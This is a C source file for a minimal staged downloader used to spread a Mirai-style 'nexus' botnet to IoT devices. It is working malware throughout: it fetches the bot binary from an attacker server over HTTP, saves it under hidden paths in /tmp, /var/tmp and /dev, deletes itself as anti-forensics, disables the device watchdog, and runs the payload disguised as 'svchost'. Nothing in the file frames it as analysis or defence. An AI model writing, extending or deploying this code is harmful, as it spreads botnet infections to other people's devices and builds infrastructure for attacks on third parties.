// dlr.c — minimal staged downloader for nexus bot propagation.
//
// This is the ~1KB stub that the loader echoloads onto IoT devices.
// It downloads the full bot binary via HTTP, writes it to disk,
// and executes it. All via raw syscalls — no libc dependency.
//
// Cross-compiled for 8+ architectures:
//   arm, arm7, mips, mpsl, ppc, sh4, spc, x86, m68k
//
// Usage: ./dlr <http_server_ip>
//
// Mirrors Mirai's dlr/main.c architecture exactly.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>

#ifndef BOT_ARCH
    #define BOT_ARCH "arm"
#endif

// --- raw syscall stubs (used when libc isn't linked) ---
// We compile with -nostartfiles, so these might be the only way.
// For now, we assume a minimal libc (uclibc/musl on IoT).

static int http_download(const char* server_ip, const char* out_path) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    // Build HTTP GET request.
    char req[512];
    snprintf(req, sizeof(req),
        "GET /bins/nexus.%s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "User-Agent: curl/7.0\r\n"
        "Connection: close\r\n"
        "\r\n",
        BOT_ARCH, server_ip);

    if (send(sock, req, strlen(req), 0) < 0) {
        close(sock);
        return -1;
    }

    // Open output file.
    int fd = open(out_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) {
        close(sock);
        return -1;
    }

    // Read response, skip headers, write body.
    char buf[4096];
    int total = 0;
    int in_body = 0;

    while (1) {
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n <= 0) break;

        if (!in_body) {
            // Find \r\n\r\n (header/body separator).
            for (int i = 0; i < n - 3; i++) {
                if (buf[i] == '\r' && buf[i+1] == '\n' &&
                    buf[i+2] == '\r' && buf[i+3] == '\n') {
                    // Body starts at i+4.
                    write(fd, buf + i + 4, n - (i + 4));
                    total += n - (i + 4);
                    in_body = 1;
                    break;
                }
            }
            if (!in_body) continue;
        } else {
            write(fd, buf, n);
            total += n;
        }
    }

    close(sock);
    close(fd);

    return total;
}

int main(int argc, char* argv[]) {
    // --- parse arguments ---
    const char* server_ip = "127.0.0.1";
    if (argc >= 2) {
        server_ip = argv[1];
    }

    // Remove self from disk (anti-forensics).
    char self_path[256];
    if (readlink("/proc/self/exe", self_path, sizeof(self_path) - 1) > 0) {
        self_path[255] = '\0';
        unlink(self_path);
    }

    // Disable watchdog.
    int wd = open("/dev/watchdog", O_WRONLY);
    if (wd >= 0) {
        // Write 'V' followed by close — some watchdogs interpret
        // close-without-write as "process died, reboot."
        char magic = 'V';
        write(wd, &magic, 1);
        close(wd);
    }
    // Also try the newer watchdog interface.
    int wd2 = open("/dev/misc/watchdog", O_WRONLY);
    if (wd2 >= 0) {
        char magic = 'V';
        write(wd2, &magic, 1);
        close(wd2);
    }

    // Download the real bot binary.
    const char* paths[] = {
        "/tmp/.nx",
        "/var/tmp/.nx",
        "/dev/.nx",
        NULL
    };

    const char* download_path = NULL;
    for (int i = 0; paths[i]; i++) {
        int result = http_download(server_ip, paths[i]);
        if (result > 0) {
            download_path = paths[i];
            break;
        }
        unlink(paths[i]);
    }

    if (!download_path) {
        return 1; // download failed on all paths
    }

    // Execute the downloaded binary.
    // Double-fork to daemonize.
    pid_t pid = fork();
    if (pid < 0) {
        // Fork failed — try direct exec.
        execl(download_path, "svchost", (char*)NULL);
        return 1;
    }

    if (pid == 0) {
        // Child: execute the binary.
        execl(download_path, "svchost", (char*)NULL);
        _exit(1);
    }

    // Parent: wait briefly, then exit.
    // (The new process is now running independently.)
    usleep(500000); // 500ms
    return 0;
}
